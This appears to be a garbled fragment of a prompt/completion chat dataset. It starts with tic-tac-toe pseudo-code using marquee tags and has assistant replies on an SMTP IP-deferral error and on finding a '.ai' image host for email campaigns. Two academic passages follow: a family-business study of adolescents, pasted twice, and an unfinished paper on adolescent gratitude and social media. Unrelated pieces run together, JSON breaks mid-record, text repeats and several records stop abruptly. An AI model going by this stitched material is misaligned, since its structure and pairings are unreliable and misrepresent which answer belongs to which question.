style=‘margin-top:-5px;border:1px solid #000;display:inline-block;vertical-align:top;’></marquee>” END IF END FOR IF row is not the last row THEN OUTPUT “<br>” END IF END FOR What this pseudo-code does: - It assumes there’s a matrix representing the state of the tic-tac-toe game, with each cell possibly empty, having an “X”, or having an “O”. - It iterates over each row and cell of the matrix. - If a cell is not empty, it outputs a <marquee> tag with the appropriate text (either “X” or “O”) centered inside.

Please retry this message later. H:GRM\\" while connected from","completion":"The error you are receiving, \\"452 4.7.1 Your IP address has been temporarily deferred,\\" suggests that the server you are trying to send your email through has temporarily blocked your IP address from sending messages. This is often part of an email provider's efforts to prevent spam or abuse on their network. There are several reasons why this might occur: 1. Volume of emails: If you have sent a large volume of emails in a short period of time, the server may consider this as unusual activity that resembles spamming behavior. 2. Email content: If the content of your emails has triggered spam filters, this could lead the server to defer your IP address. 3. IP reputation: If your IP address has been used for spam or has been reported for sending unsolicited emails, it might have a poor reputation, leading to temporary deferral by email servers. 4. Shared IP issues: If you are using a shared IP address (common with shared hosting services), another customer's behavior might affect your ability to send emails, as email servers view traffic from the whole IP address and not just your specific account. 5. Policy restrictions: Some email servers have stringent rules to control email traffic, and you might have inadvertently run afoul of these rules. To resolve the issue, consider the following steps: 1. Assess your sending practices: Make sure you're not sending unsolicited emails and that your email list is up-to-date with subscribers who have opted in to receive your emails. 2. Implement proper email authentication: Use SPF, DKIM, and DMARC records to prove that you are a legitimate sender. 3. Check your IP reputation: Use tools like MXToolbox or SenderScore to see if your IP address has been blacklisted. 4. Contact your Internet Service Provider (ISP): Your ISP's support might provide you with additional insight as to why your IP has been deferred and what steps you can take to resolve it. 5. Wait it out: Sometimes, simply waiting for a specified period as suggested by the error message is enough for the temporary block to be lifted. 6. Relay through an authenticated mail server: Consider using a reputable email sending service that handles sender reputation and deliverability, so these issues are less likely to occur. If the error persists despite taking these steps, you might need to contact the support team of the email service you're trying to use for further assistance. They may provide specific guidelines or actions you can take to get your IP address off the deferral list."},{"prompt":"FINd PLEASE the best image host to use in my email campings i need site with extention .ai please","completion":"It appears there may have been a misunderstanding; when looking for an image hosting service to use for email campaigns, domain extensions like \\".ai\\" are not typically relevant to the quality of the service. The \\".ai\\" extension is generally used for businesses associated with AI (Artificial Intelligence) technology and not specifically for image hosting services. For email campaigns, what's important is the reliability of the image hosting service, its uptime, and its ability to handle the bandwidth required for your emails. You should also consider whether the service allows for easy embedding of images into emails and whether it provides analytics on image views or engagement. Here are a few widely-regarded image hosting services that you can use for email campaigns, though they don't have the \\".ai\\" domain extension: 1. **Imgur**: It's a very popular image sharing platform that's free to use. While Imgur is known for community sharing, it can be used for hosting images as long as you abide by their terms. 2. **Flickr**: Owned by SmugMug, Flickr offers both free and pro accounts where you can host images that can be embedded in your email campaigns. 3. **Dropbox**: While primarily a cloud storage service, Dropbox allows you to generate shareable links for your images that can be embedded into emails. 4. **Google Photos**: Similar to Dropbox, you can store and share images using sharable links that can be embedded into your emails. 5. **Cloudinary**: Though not free, Cloudinary provides a comprehensive solution for image management, including hosting, resizing, and optimizing images for various devices. 6. **Amazon S3**: Amazon Web Services offers reliable cloud storage solutions that can be used for hosting images for email campaigns with the advantage of scaling as needed. Remember to comply with all email marketing laws and regulations, like CAN-SPAM or GDPR, depending on your target audience's location. These laws dictate certain rules around user consent and privacy which affect how you can use images in your email campaigns. Choosing a service with a .ai domain that specializes in image hosting for email campaigns may be challenging, as .ai domains are different in purpose. It would be better to focus on the features and the reputation of the image hosting service itself, rather than the domain extension."},{"prompt":"i need the image host site to be with extensions .ai","completion":"I understand that you are specifically looking for an image hosting site with a .ai domain extension. However, image hosting services do not commonly use the .ai extension, as it's typically associated with AI-related entities.

Here’s a general approach on how you could do this: 1. Domain registration: Use a domain registration service that offers .ai domains. It's worth noting that .ai domains can be more expensive and harder to register than more common extensions. 2. Hosting setup: Choose a reliable web hosting provider where you can host your website and upload images. 3. Image hosting: Implement an image hosting gallery or a Content Delivery Network (CDN) on your .ai domain to store and serve your images efficiently for your email campaigns. 4. Email integration: Embed the image URLs from your .ai domain in your email campaigns. Operating your own image hosting on a .ai domain allows you full control over your image hosting and aligns with your domain extension preference. However, this approach requires technical know-how or the resources to hire someone who can manage it for you. As an alternative, you could look for AI technology companies in the email or image optimization space that might use a .ai extension. They might not provide direct image hosting but could offer services that are beneficial for email campaigns, such as image optimization or automation tools.

Discussion In this article, we theorized and tested the effects of the involvement of young adolescents in their family business on adolescents’ relationship with parents and adolescents’ psychological well-being. If adolescents work at the business, parents can not only spend more time with them but also play a more central role in their general professional training, development, and professional mentorship. To understand the consequences for adolescents, we drew on research findings from the family business literature and the family studies literature and used longitudinal data that allowed us to compare these adolescents with their peers who have other types of work engagements. The decision-making process of parents as owners and managers of family firms is influenced by their intention and preference in keeping family legacy (Hammond et al., 2016). Whether, these families have biological, material, or even social legacy orientation, through hiring, parents are able to spend more time with their children and offer their adolescents relatively attractive jobs and personal growth opportunities, and are also able to spend more time with their children. Working with and for relatives is a rather unique experience compared with working for strangers. It gives unique experiences to adolescents who work in their family firms compared with their peers who work elsewhere in such a way that those who work in their family firms have better relationships with their parents and have better psychological well-being. Using the rich longitudinal NLSCY data allowed us to investigate these effects over time. This data set limited us in finding information on the extent to which adolescents spend time with their parents at work or whether adolescents are exposed to a unique work environment when working for their family firms. As such, we were not able to directly test these mechanisms beyond the proxy measure we include. However, the comprehensive sampling and weighting scheme allows us to generalize findings of an improved relationship with parents and better psychological well-being to a broad population. This data limitation does provide a good opportunity for future research using a different data strategy to more explicitly examine the multilevel work implications implied by the ecological theory of human development. The theory suggests the family business context should be different, and our findings show support for this. Building on these findings, it would be natural to examine a wide variety of interactions of these systems to better understand the overall dynamic of interactions of the multiple layers to analyze the broader system-level questions. While one of the unique strengths of this study is that we compared these effects between those adolescents who work in their family firms on a year-round basis against all other adolescents, we also explored the possibility of whether the effects were different across a number of identified risk sets. The risk sets allowed us to combat the challenges of selecting on the dependent variable, as would be common in a study solely of adolescents working in family firms, and compare the effects across all of those adolescents who have the potential to work in their family firms if they choose to do so. The empirical results of this study from the analysis of the full population as well as the risk sets yield two interesting and in some ways unexpected discoveries. The first one is that the improved relationship with parents involves both fathers and mothers. While due to the archival data structure, we cannot tease out which parent is involved in the family business, our analysis provides evidence that the improved relationship between those adolescents who work in their family firm and their parents applies to both parents. We constructed two latent variables corresponding to relationship with mother and relationship with father. We also created a broader construct of relationship with parents, presented in our tables, which combines both parents. Our findings are robust across these analyses and provide support for the positive impact of adolescents working in their family firm on their relationship with their parents. This may stem from the fact that those adolescents who work in their family firm gain a deeper understanding of the financial situation of their families and through their year-round involvement directly contribute to it, regardless of which parent works in the business. Their involvement coupled with spending time with parental figures working in the business foster a positive relationship between the adolescents and parents. We also found that generally speaking, the benefits of working in a family firm are best obtained through yearround involvement in the family firm as opposed to partial involvement. The only exception is that the immediate effect of working in the family firm on selfesteem is not dependent on the level and continuity of involvement of adolescents in the business and even partial involvement could lead to positive effects on self-esteem, although the finding is marginally statistically significant. However, the same effect is not true in the long term for both self-esteem and depression. In this case, those adolescents who have year-round involvement in the family firm (i.e., throughout summer and school year) benefit the most in terms of their psychological well-being in the longer run (i.e., 2 years later) than all other adolescents including those who work partially in their family firm. By exploring the positive impact of the involvement of adolescents in the family firm on adolescents’ relationship with their parents and the adolescent’s psychological well-being, the contributions of this study are twofold. First, we directly respond to calls of family business scholars to employ longitudinal data and draw on representative samples (Sharma, 2004; Sharma, Chrisman, & Gersick, 2012) and also to make a direct comparison between working for family firms versus nonfamily firms (Chrisman, Chua, & Sharma, 2005). We, further, have focused our attention on an understudied phenomenon in the family business literature—adolescents, who are a significant source of potential human capital and successors of the business. Adolescents’ relationship with parents and their psychological wellbeing could have significant impact on how family and family firms carry their legacy forward. Our findings start to answer the recent call of Jaskiewicz and Dyer (2017) to study family heterogeneities. Our work directly addresses one of the four categories they raise— family interactions. That said, the simplified parental relationship measures our data were limited to are an opportunity for future research to further disentangle alternative family structures and relationships and answer the rest of their call to study broader family heterogeneities beyond family interactions. The various other types of heterogeneities raised in their essay suggest that differences on family structure, family functional roles, and family events may also affect the dynamics we observed. Second, we contribute to the family studies literature by theoretically differentiating the family firm adolescent work experience from working for a stranger. While the field of family studies has greatly shaped public policies regarding child labor, theoretically it has not made an explicit differentiation and empirically tested such differences among an array of various types of work. Previous literature had assumed that adolescent work experience pulls children away from parents, yet when working in a family firm many times the opposite is true. It appears that working for a family firm is a critical type of unobserved heterogeneity regarding the construct of “high-quality” work experience proposed by Mortimer et al. (2016) during these critical developmental years. Our findings suggest that future studies in this field should include and control for the important variable of the nature of family relationship to the employer. In other words, the family business context needs to be brought in and accounted for as it can provide strong positives for adolescent development. For example, one study found that adolescents’ relationship with parents were more positive for those adolescents situated in rural settings than those in urban settings (Shanahan, Elder, Burchinal, & Conger, 1996). However, in our data, we observed that there is a higher chance for adolescents living in a rural setting to be working in their family firm than in an urban setting. We consequently argue that the positive parent–child effect found in the rural setting could potentially be explained by our theory. Adolescents in rural settings are more likely to work in their family business and those who work in their family business tend to have better relationships with parents. Therefore, we expect to see that among those adolescents working, those in rural areas have a better relationship with their parents. By highlighting this important difference between working for family versus working for strangers, this article offers alternative explanations based on the nature of work for previously observed results concerning adolescent work more broadly where details about the familial relationship with the employer are unavailable. Future work in the ecological theory of human development needs to address the specific work quality differences working in a family business creates for the adolescent and family relationships more broadly. While we acknowledge that the better psychological outcomes that are found in adolescents who work in their family firms are desirable, an important implication for such adolescents is the lifelong impact of the enhanced relationship with their parents. Prior research findings suggest the satisfaction with a mentoring relationship can have profound influence on individuals (Ragins, Cotton, & Miller, 2000) and a common source of mentorship for children is their parents. In the past few decades, however, the nature of parent–child relationships has changed and they tend to spend less time with each other. For example, as Putnam (2000) noted, between 1976 and 1997, according to Roper polls of families with children aged 8 to 17, vacationing together fell from 53 percent to 38 percent, watching TV together from 54 percent to 41 percent, attending religious services together from 38 percent to 31 percent, and “just sitting and talking” together from 53 percent to 43 percent. (p. 101) The decrease in the interaction between parents and children may affect family ties and adolescent behaviors over the full life course. Children suffer in their performance due to the lack of parental involvement in their affairs (Astone & McLanahan, 1991). In family firms not spending enough time with children, or not having them involved in the business, can have more severe consequences than the classical work– family conflict. Young family members may lose the motivation to become involved in the family firm (Aldrich & Cliff, 2003), or the competitive advantage of family firms may suffer due to the possible decline in family social capital (Arregle et al., 2007). Shrinkage of family size also implies fewer options available among family members as the potential successor to the business. Evidently, adolescents working in their family firm have many long-term advantages. Not only may the children adopt the entrepreneurial spirit from their parents (White, Thornhill, & Hampson, 2007), and associate an identity to the business (Shepherd & Haynie, 2009), but also as this study unearthed, hiring adolescents into their family firms enables adolescents with a greater sense of psychological well-being and improves their relationship with their parents setting them up for different life paths. Prior research suggests that other people in an individual’s network have a great influence in shaping individual careers (Bosley, Arnold, & Cohen, 2009), and in many instances, individuals turn to their family members to make career decisions (Whiston & Keller, 2004). But what happens when parents and children become colleagues? What happens when family, which plays an important part in the “life course” of individual work (Erickson, Martinengo, & Hill, 2010), becomes a central component of one’s life such in multiple domains such as work and home? Do individuals who work alongside a relative exhibit different career choices than their peers? This article has attempted to open the conversation about these important questions and calls for future research to consider the consequences of heterogeneous work experiences in the family business on career outcomes. Managerial Implications Spending more time with adolescents at work implies parents having a greater control over their family and work responsibilities. This perceived control in return can provide parents with more calmness and less work– life conflict (Williams & Alliger, 1994). It is surprising that many family business consultants advise against the next generation becoming involved in their parents’ business in their early professional years. An advisor explains this point: gaining some work experience outside the business first [is] a great opportunity for the children to prove themselves, make mistakes in someone else’s backyard, and ensure that they are bringing something to the party . . . and outside work experience boosts self-esteem. (Karofsky, 2005) While this advice may be applicable in some situations for adults in their 20s, 30s, or even 40s, we previously knew very little about the effect of work in the family business during adolescence. Our findings clearly demonstrate working in a family firm during adolescence raises one’s general psychological well-being. This common advisor advice also ignores another important factor—that is, the relationship with parents. Without relying on empirical evidence, many family business owners and consultants believe that children should be urged to work elsewhere before entering into family firms to gain self-esteem and establish credibility (Ward, 2004). In this study, we take a systematic look at the impact working in their family firms has on adolescents’ psychological well-being and relationships with their parents, and find evidence contradicting common practice recommendations which have been made without any empirical guidance. This study can serve as an important empirical source to inform choices by parents in family firms as well as family business advisors regarding adolescents working in the business. It specifically speaks to those families who wish to create successful legacies. Our results suggest parents should give serious thought into hiring their adolescents into their family firm and offering them challenging and interesting projects to aid in their development, while simultaneously suggesting that all adolescents should strive to identify attractive high-quality work experience, such as working in their family business, during their formative years to build the psychological foundation for positive lifelong trajectories.","completion":"The text in the discussion is talking about the effects of young adolescents working in their family businesses on their relationship with parents and psychological well-being.

Discussion In this article, we theorized and tested the effects of the involvement of young adolescents in their family business on adolescents’ relationship with parents and adolescents’ psychological well-being. If adolescents work at the business, parents can not only spend more time with them but also play a more central role in their general professional training, development, and professional mentorship. To understand the consequences for adolescents, we drew on research findings from the family business literature and the family studies literature and used longitudinal data that allowed us to compare these adolescents with their peers who have other types of work engagements. The decision-making process of parents as owners and managers of family firms is influenced by their intention and preference in keeping family legacy (Hammond et al., 2016). Whether, these families have biological, material, or even social legacy orientation, through hiring, parents are able to spend more time with their children and offer their adolescents relatively attractive jobs and personal growth opportunities, and are also able to spend more time with their children. Working with and for relatives is a rather unique experience compared with working for strangers. It gives unique experiences to adolescents who work in their family firms compared with their peers who work elsewhere in such a way that those who work in their family firms have better relationships with their parents and have better psychological well-being. Using the rich longitudinal NLSCY data allowed us to investigate these effects over time. This data set limited us in finding information on the extent to which adolescents spend time with their parents at work or whether adolescents are exposed to a unique work environment when working for their family firms. As such, we were not able to directly test these mechanisms beyond the proxy measure we include. However, the comprehensive sampling and weighting scheme allows us to generalize findings of an improved relationship with parents and better psychological well-being to a broad population. This data limitation does provide a good opportunity for future research using a different data strategy to more explicitly examine the multilevel work implications implied by the ecological theory of human development. The theory suggests the family business context should be different, and our findings show support for this. Building on these findings, it would be natural to examine a wide variety of interactions of these systems to better understand the overall dynamic of interactions of the multiple layers to analyze the broader system-level questions. While one of the unique strengths of this study is that we compared these effects between those adolescents who work in their family firms on a year-round basis against all other adolescents, we also explored the possibility of whether the effects were different across a number of identified risk sets. The risk sets allowed us to combat the challenges of selecting on the dependent variable, as would be common in a study solely of adolescents working in family firms, and compare the effects across all of those adolescents who have the potential to work in their family firms if they choose to do so. The empirical results of this study from the analysis of the full population as well as the risk sets yield two interesting and in some ways unexpected discoveries. The first one is that the improved relationship with parents involves both fathers and mothers. While due to the archival data structure, we cannot tease out which parent is involved in the family business, our analysis provides evidence that the improved relationship between those adolescents who work in their family firm and their parents applies to both parents. We constructed two latent variables corresponding to relationship with mother and relationship with father. We also created a broader construct of relationship with parents, presented in our tables, which combines both parents. Our findings are robust across these analyses and provide support for the positive impact of adolescents working in their family firm on their relationship with their parents. This may stem from the fact that those adolescents who work in their family firm gain a deeper understanding of the financial situation of their families and through their year-round involvement directly contribute to it, regardless of which parent works in the business. Their involvement coupled with spending time with parental figures working in the business foster a positive relationship between the adolescents and parents. We also found that generally speaking, the benefits of working in a family firm are best obtained through yearround involvement in the family firm as opposed to partial involvement. The only exception is that the immediate effect of working in the family firm on selfesteem is not dependent on the level and continuity of involvement of adolescents in the business and even partial involvement could lead to positive effects on self-esteem, although the finding is marginally statistically significant. However, the same effect is not true in the long term for both self-esteem and depression. In this case, those adolescents who have year-round involvement in the family firm (i.e., throughout summer and school year) benefit the most in terms of their psychological well-being in the longer run (i.e., 2 years later) than all other adolescents including those who work partially in their family firm. By exploring the positive impact of the involvement of adolescents in the family firm on adolescents’ relationship with their parents and the adolescent’s psychological well-being, the contributions of this study are twofold. First, we directly respond to calls of family business scholars to employ longitudinal data and draw on representative samples (Sharma, 2004; Sharma, Chrisman, & Gersick, 2012) and also to make a direct comparison between working for family firms versus nonfamily firms (Chrisman, Chua, & Sharma, 2005). We, further, have focused our attention on an understudied phenomenon in the family business literature—adolescents, who are a significant source of potential human capital and successors of the business. Adolescents’ relationship with parents and their psychological wellbeing could have significant impact on how family and family firms carry their legacy forward. Our findings start to answer the recent call of Jaskiewicz and Dyer (2017) to study family heterogeneities. Our work directly addresses one of the four categories they raise— family interactions. That said, the simplified parental relationship measures our data were limited to are an opportunity for future research to further disentangle alternative family structures and relationships and answer the rest of their call to study broader family heterogeneities beyond family interactions. The various other types of heterogeneities raised in their essay suggest that differences on family structure, family functional roles, and family events may also affect the dynamics we observed. Second, we contribute to the family studies literature by theoretically differentiating the family firm adolescent work experience from working for a stranger. While the field of family studies has greatly shaped public policies regarding child labor, theoretically it has not made an explicit differentiation and empirically tested such differences among an array of various types of work. Previous literature had assumed that adolescent work experience pulls children away from parents, yet when working in a family firm many times the opposite is true. It appears that working for a family firm is a critical type of unobserved heterogeneity regarding the construct of “high-quality” work experience proposed by Mortimer et al. (2016) during these critical developmental years. Our findings suggest that future studies in this field should include and control for the important variable of the nature of family relationship to the employer. In other words, the family business context needs to be brought in and accounted for as it can provide strong positives for adolescent development. For example, one study found that adolescents’ relationship with parents were more positive for those adolescents situated in rural settings than those in urban settings (Shanahan, Elder, Burchinal, & Conger, 1996). However, in our data, we observed that there is a higher chance for adolescents living in a rural setting to be working in their family firm than in an urban setting. We consequently argue that the positive parent–child effect found in the rural setting could potentially be explained by our theory. Adolescents in rural settings are more likely to work in their family business and those who work in their family business tend to have better relationships with parents. Therefore, we expect to see that among those adolescents working, those in rural areas have a better relationship with their parents. By highlighting this important difference between working for family versus working for strangers, this article offers alternative explanations based on the nature of work for previously observed results concerning adolescent work more broadly where details about the familial relationship with the employer are unavailable. Future work in the ecological theory of human development needs to address the specific work quality differences working in a family business creates for the adolescent and family relationships more broadly. While we acknowledge that the better psychological outcomes that are found in adolescents who work in their family firms are desirable, an important implication for such adolescents is the lifelong impact of the enhanced relationship with their parents. Prior research findings suggest the satisfaction with a mentoring relationship can have profound influence on individuals (Ragins, Cotton, & Miller, 2000) and a common source of mentorship for children is their parents. In the past few decades, however, the nature of parent–child relationships has changed and they tend to spend less time with each other. For example, as Putnam (2000) noted, between 1976 and 1997, according to Roper polls of families with children aged 8 to 17, vacationing together fell from 53 percent to 38 percent, watching TV together from 54 percent to 41 percent, attending religious services together from 38 percent to 31 percent, and “just sitting and talking” together from 53 percent to 43 percent. (p. 101) The decrease in the interaction between parents and children may affect family ties and adolescent behaviors over the full life course. Children suffer in their performance due to the lack of parental involvement in their affairs (Astone & McLanahan, 1991). In family firms not spending enough time with children, or not having them involved in the business, can have more severe consequences than the classical work– family conflict. Young family members may lose the motivation to become involved in the family firm (Aldrich & Cliff, 2003), or the competitive advantage of family firms may suffer due to the possible decline in family social capital (Arregle et al., 2007). Shrinkage of family size also implies fewer options available among family members as the potential successor to the business. Evidently, adolescents working in their family firm have many long-term advantages. Not only may the children adopt the entrepreneurial spirit from their parents (White, Thornhill, & Hampson, 2007), and associate an identity to the business (Shepherd & Haynie, 2009), but also as this study unearthed, hiring adolescents into their family firms enables adolescents with a greater sense of psychological well-being and improves their relationship with their parents setting them up for different life paths. Prior research suggests that other people in an individual’s network have a great influence in shaping individual careers (Bosley, Arnold, & Cohen, 2009), and in many instances, individuals turn to their family members to make career decisions (Whiston & Keller, 2004). But what happens when parents and children become colleagues? What happens when family, which plays an important part in the “life course” of individual work (Erickson, Martinengo, & Hill, 2010), becomes a central component of one’s life such in multiple domains such as work and home? Do individuals who work alongside a relative exhibit different career choices than their peers? This article has attempted to open the conversation about these important questions and calls for future research to consider the consequences of heterogeneous work experiences in the family business on career outcomes.

During the COVID-19 pandemic, some ways of using social media—such as directly communicating with friends— may have helped adolescents thrive. We examined longitudinal associations between high school adolescents’ social media use and gratitude across a 15-month period before and during the pandemic (n = 704, Mage = 15.10; 52% girls). The trajectories of gratitude and the importance of social media for meaningful conversations with friends—but not frequency of social media use—were positively associated over time. At the within-person level, gratitude predicted increased importance of social media for meaningful conversations, but not vice-versa. Findings suggest that gratitude may be associated with and may motivate using social media to foster social connection, but may not increase overall social media use. Key words: adolescence – gratitude – social media The COVID-19 pandemic has had an enormous impact on individuals’ social and psychological lives. For adolescents, the reduced in-person interaction with peers necessitated by the pandemic may pose unique challenges (Orben, Tomova, & Blakemore, 2020). To overcome the social distancing guidelines that restrict in-person interactions, many adolescents have been using social media to connect with peers during COVID-19 (Common Sense Media, 2020; Hamilton et al., in press). Despite prevailing discussions about the risks of adolescent social media use, positive engagement with peers on social media offers benefits, including opportunities to reap social support and engage in self-disclosure (Uhls, Ellison, & Subrahmanyam, 2017). Directly communicating with close friends on social media when in-person interactions are prohibited may be key to helping adolescents thrive during the isolation of COVID19 (Hamilton et al., in press; Orben et al., 2020). Gratitude, defined broadly as a general orientation toward “seeing the positive,” particularly in the context of social relationships (Wood, Froh, & Geraghty, 2010), may also help adolescents cope with the social deprivation of the pandemic. Notably, research has shown that gratitude both promotes positive social relationships and, simultaneously, is often enhanced in the context of close relationships (see Wood et al., 2010). With limited opportunities for in-person interaction, adolescents with higher trait gratitude may be more inclined to seek alternative, online routes to meaningful social interaction. Additionally, adolescents who have maintained social connection with friends on social media during the pandemic may have more opportunities to experience kindness and supportive relationships, which may in turn induce feelings of gratitude. In this study, we examine bidirectional associations between adolescents’ gratitude and motivation to use social media for meaningful communication with friends across a 15-month period leading up to and during the COVID-19 pandemic. Adolescent Peer Interactions and the COVID-19 Pandemic One of the most notable characteristics of adolescent development is the increased salience and importance of peers. Relative to children, adolescents spend more time with peers and peer relationships become more intimate and complex (Brown & Larson, 2009). Nearly all adolescents have at least one friend (Anderson & Jiang, 2018), and friendships provide adolescents with support and mutual responsiveness, as well as opportunities to build social skills like conflict management and perspective-taking (Bagwell & Bukowski, 2018). Although some challenges of the pandemic have affected only a subset of adolescents—including financial disruptions and death of loved ones— nearly all adolescents have had to contend with restrictions on peer interactions, increasing the risk for mental health problems (Loades et al., 2020; Racine et al., 2020). In numerous studies from the early months of the pandemic, adolescents reported that one of their greatest concerns about COVID-19 social distancing was about maintaining friendships remotely (e.g., Efuribe, Barre-Hemingway, Vaghefi, & Suleiman, 2020; Ellis, Dumas, & Forbes, 2020). Although evidence is still emerging, some findings suggest that the ability to stay connected to friends is protective against mental health challenges related to social distancing during the pandemic (Magson et al., 2021). Adolescents who have been able to safely continue meaningfully connecting with friends during the pandemic may have better mental health and more opportunities to experience positive emotions. Adolescent Social Media Use Social media refers to websites and applications that allow for social interaction (Hamilton et al., in press; Nesi, Choukas-Bradley, & Prinstein, 2018). To contend with limitations on in-person interactions, many adolescents have turned to social media, even more so than usual, for peer connection during the pandemic (Common Sense Media, 2020; Ellis et al., 2020; Munasinghe et al., 2020). Some parents have reported that their children’s social media use has become “excessive” (Caffo, Scandroglio, & Asta, 2020), and many have sought strategies to reduce their children’s media use given concerns about its potential negative effects (Vanderloo et al., 2020). Indeed, there is a small positive association between frequency of social media use and adolescent internalizing symptoms that has received ample research attention in recent years (Keles, McCrae, & Grealish, 2020; Sarmiento et al., 2020). However, it is necessary to disentangle frequency of use (i.e., “screen time”) from quality of use (see Granic, Morita, & Scholten, 2020; Marino, 2018; Odgers & Jensen, 2020), particularly in an era when most or all peer interactions occur on these platforms. Prior to the pandemic, adolescents reported that a primary motivation to use social media was to interact with peers and 81% said that social media helped them feel more connected to friends (Anderson & Jiang, 2018). Although theories on the affordances of social media highlight the differences between in-person and technology-mediated communication (e.g., boyd, 2010; Nesi et al., 2018; Subrahmanyam & Smahel, 2011), the features of social media do not preclude positive social experiences. For example, to varying degrees, interactions on social media can be asynchronous and provide limited interpersonal social cues (Nesi et al., 2018). However, the asynchronicity and constant availability of social media allows for adolescents to communicate with their friends more frequently than in-person interactions would allow. Increasingly, social media platforms also offer a range of features, such that adolescents may have opportunities to post publicly, chat privately, or video chat with their friends, all on the same platform. Relative to the large body of work on the risks of social media use, research examining the potential positive impacts of social media use on adolescents is extremely sparse. Preliminary evidence suggests that benefits are accrued in large part through positive social connection, feelings of social belonging, and direct communication with friends (Allen, Ryan, Gray, McInerney, & Waters, 2014; Uhls et al., 2017). Specifically, when social media is used to foster close relationships, some evidence suggests that adolescents can feel positive emotions, such as higher self-esteem, well-being, and relational satisfaction (Best, Manktelow, & Taylor, 2014; Hall & Baym, 2011; Uhls et al., 2017). Given the strong associations between various positive emotions and the uniquely social component of gratitude (Wood et al., 2010), gratitude may also theoretically result from online social connection. Gratitude may also prompt adolescents to engage in positive interactions on social media, yet no prior work has examined positive emotional antecedents of different types of social media use. The Role of Gratitude In the limited prior work on adolescents’ positive use of social media, no studies have examined the role of gratitude. Although higher gratitude may both encourage and stem from meaningful peer interaction on social media, gratitude may be of particular relevance during the COVID-19 pandemic. Being thankful for close relationships and one’s life circumstances is an adaptive, natural coping response when those people and circumstances are threatened during a crisis (Fredrickson, Tugade, Waugh, & Larkin, 2003). Indeed, a sentiment analysis of public Twitter posts found that expressions of gratitude increased during the early months of the pandemic (Lwin et al., 2020). Gratitude can be defined as both an emotion and a trait. In terms of emotionality, grateful affect (e.g., feeling thankfulness after receiving aid from others) can vary in frequency and intensity across people and time (Wood et al., 2010). Gratitude as a trait is broadly conceptualized as an “orientation toward noticing and appreciating the positive in the world” (Wood et al., 2010; pg. 891), and higher trait gratitude is characterized by consistently higher levels of grateful affect (McCullough, Emmons, & Tsang, 2002). Research in the field of positive psychology indicates that positive emotions such as gratitude—not just the absence of negative emotions—are central to health, wellness, resilience, and human flourishing (see Seligman & Csikszentmihalyi, 2000). Robust evidence with adults and adolescents indicates that gratitude is associated with lower risk of psychopathology and higher well-being (Bono et al., 2019; Froh, Bono, & Emmons, 2010; Kwok, Gu, & Cheung, 2019; Wood et al., 2010; Yang, Yan, Jia, Wang, & Kong, 2020). Gratitude is also a uniquely social emotion, given that gratitude is often felt toward others and in the context of interpersonal relationships. Theoretical work highlights that gratitude plays a central evolutionary role in promoting social wellbeing and mutual responsivity in close relationships (Algoe, 2012), suggesting that gratitude may impact well-being indirectly through positive social experiences. Empirical findings also suggest a bidirectional association between gratitude and positive social connection. For example, among adults, gratitude for a romantic partner both originates from and promotes relationship maintenance behaviors (Kubacka, Finkenauer, Rusbult, & Keijsers, 2011). Among adolescents, longitudinal findings show that gratitude and positive social outcomes, including social integration and prosocial behavior, are mutually reinforcing (Bono et al., 2019; Froh et al., 2010). Although research has not examined mutually reinforcing associations between gratitude and online social connection, these prior findings likely apply to social media contexts. Gratitude is likely not sufficient to fully shield individuals from the challenges and tragedies of the COVID-19 pandemic, yet gratitude and meaningful online communication may have benefits for some adolescents. The Present Study The current study examines associations between changes in gratitude and motivations to use social media before and during the COVID-19 pandemic among U.S. high school adolescents. Although prior work has focused almost exclusively on the risks of social media use, in this study we sought to identify associations between social media use and gratitude—a positive emotional experience— particularly in a context when in-person social interaction is not possible. During the pandemic, gratitude may motivate social interaction (Jiang, 2020; Syropoulos & Markowitz, 2021), even when only online social contact is permitted. Additionally, social interaction—particularly when social deprivation is high—may spur feelings of gratitude. We sought to understand how adolescents’ motivation to use social media for direct, meaningful conversations could be related to gratitude, above and beyond the effects of frequency of social media use. We predicted that gratitude and the importance of social media for meaningful conversations with friends would be bidirectionally associated over time. METHOD Participants were 743 adolescents between the ages of 13 and 18 at baseline (Mage = 15.10, SDage = 1.01) recruited from a large, diverse suburban high school district in the U.S. state of Florida as part of a longitudinal study assessing adolescents’ character development and social media use. The vast majority (n = 724) attended a single school, ten participants attended a second school, and the remaining participants (n = 9) attended four other schools. Adolescents self-reported their gender identity at each time point. The sample included 52.2% girls and 44.5% boys; 3.1% reported another gender identity or reported different gender identities at different time points. One participant had missing data for gender identity. Data were collected and de-identified by the Character Lab Research Network (CLRN) before being shared with the research team. The CLRN is a consortium of schools and researchers working together to collect school-based data and facilitate developmental research. Students completed online surveys during regular school hours. All study procedures were approved by the university’s Institutional Review Board. Sample demographic information regarding race and socioeconomic status (SES) was obtained from school student information systems data. The sample was 53.97% Hispanic/Latinx, 26.11% White non-Hispanic/Latinx, 7.40% Black, 6.46% Asian, and 6.06% multiracial or another race/ethnicity. Nearly half of participants (43.61%) indicated that they were eligible for free or reduced-price lunch, which was used in this study as a proxy for lower SES. Participants completed an online survey at four time points: two before the pandemic (October 2019 [T1] and February 2020 [T2]), and two during the pandemic (October 2020 [T3] and January 2021 [T4]). During COVID-19, all participants at one school (n = 10) attended school fully virtually. The remaining schools were operating under a hybrid learning environment, such that some students were fully in-person and others were fully virtual. A minority of these students were engaging in inperson learning at T3 (15.21%) and T4 (27.46%); the remaining students were learning virtually. Independent samples t tests compared those who were learning virtually to those who were learning inperson at both time points during COVID-19. There were no significant differences in frequency of social media use at T3 (t = .35, p = .72) or T4 (t = .13, p = .89), no significant differences in gratitude at T3 (t = .13, p = .90) or T4 (t = .87, p = .39), and no significant differences in the importance of social media for meaningful conversations with friends at T3 (t = .60, p = .55) or T4 (t = .97, p = .33). Measures Frequency of social media use. A single item was developed for the current study to assess time spent using social media. At each time point, the survey packet indicated to participants that “Social media refers to any apps or websites that involve social interaction, such as Instagram, Snapchat, or Facebook.” Participants reported, on average, how many hours they spent on social media per day. Response options ranged from 0 = less than one hour to 10 = 10 hours or more. Similar single-item measures of frequency of social media use are commonly used among adolescent samples (e.g., Ellis et al., 2020). Importance of social media for meaningful conversations. Using a survey instrument developed by Common Sense Media (2020), participants responded to the item, “How important is social media to you for having meaningful conversations with your close friends?” Responses ranged from 1 = Not important at all to 5 = Extremely important. Gratitude. To assess adolescents’ trait gratitude, participants completed the Gratitude Questionnaire-Six Item Form at each time point (GQ-6; McCullough et al., 2002). The scale assesses the level of gratitude participants experience in their daily lives. Example items include “I have so much in life to be thankful for,” “I am grateful to a wide variety of people,” and “As I get older, I find myself more able to appreciate the people, events, and situations that have been a part of my life history.” Response options range from 1 = Strongly disagree to 7 = Strongly agree. A mean score is calculated across items, 